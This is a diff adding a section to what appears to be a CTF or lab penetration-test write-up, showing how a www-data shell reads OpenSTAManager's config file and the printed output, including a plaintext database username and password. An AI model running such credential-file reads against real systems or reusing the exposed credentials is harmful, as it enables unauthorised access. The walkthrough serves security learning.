@@ -1160,6 +1160,97 @@ We have an **interactive shell on the target machine as www-data**. The foothol
 ### 4.1 Database Credential Extraction
 
 Read the application's configuration file directly from the web directory to recover the database credentials stored inside it.
+
+**Command:** `cat /var/www/html/openstamanager/config.inc.php`
+
+**Breakdown:**
+
+- `cat`
+    - **Description:** Prints the contents of a file to the terminal.
+    - **Purpose:** Reads the OpenSTAManager configuration file directly from disk — no special privileges required since `www-data` owns the web directory and can read its own application files.
+- `/var/www/html/openstamanager/config.inc.php`
+    - **Description:** The primary configuration file for the OpenSTAManager installation.
+    - **Purpose:** Web applications store their database connection details here in plaintext — host, username, password, and database name — so the application can connect to MySQL on startup.
+
+**Result:**
+
+```shell
+www-data@enigma:~/html/openstamanager/files$ cat /var/www/html/openstamanager/config.inc.php
+<es$ cat /var/www/html/openstamanager/config.inc.php
+<?php
+
+/*
+ * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
+ * Copyright (C) DevCode s.r.l.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program. If not, see <https://www.gnu.org/licenses/>.
+ */
+
+// Impostazioni di base per l'accesso al database
+$db_host = 'localhost';
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name = 'openstamanager';
+// $port = '|port|';
+$db_options = [
+    // 'sort_buffer_size' => '2M',
+];
+
+// Tema selezionato per il front-end
+$theme = 'default';
+
+// Impostazioni di sicurezza
+$redirectHTTPS = false; // Redirect automatico delle richieste da HTTP a HTTPS
+$disableCSRF = true; // Protezione contro CSRF
+
+// Impostazioni di debug
+$debug = false;
+
+$disable_hooks = false;
+
+// Permette di accedere solo con un ip (da utilizzare per manutenzione)
+$maintenance_ip = '';
+
+// Personalizzazione dei gestori dei tag personalizzati
+$HTMLWrapper = null;
+$HTMLHandlers = [];
+$HTMLManagers = [];
+
+// Lingua del progetto (per la traduzione e la conversione numerica)
+$lang = 'en_GB';
+// Personalizzazione della formattazione di timestamp, date e orari
+$formatter = [
+    'timestamp' => 'd/m/Y H:i',
+    'date' => 'd/m/Y',
+    'time' => 'H:i',
+    'number' => [
+        'decimals' => ',',
+        'thousands' => '',
+    ],
+];
+
+// Ulteriori file CSS e JS da includere
+$assets = [
+    'css' => [],
+    'print' => [],
+    'js' => [],
+];
+
+// Configura il limite di tempo di esecuzione del file cron.php
+$php_time_limit = '';
+www-data@enigma:~/html/openstamanager/files$ 
+```
 <div align="center">
 <br>
 <br>
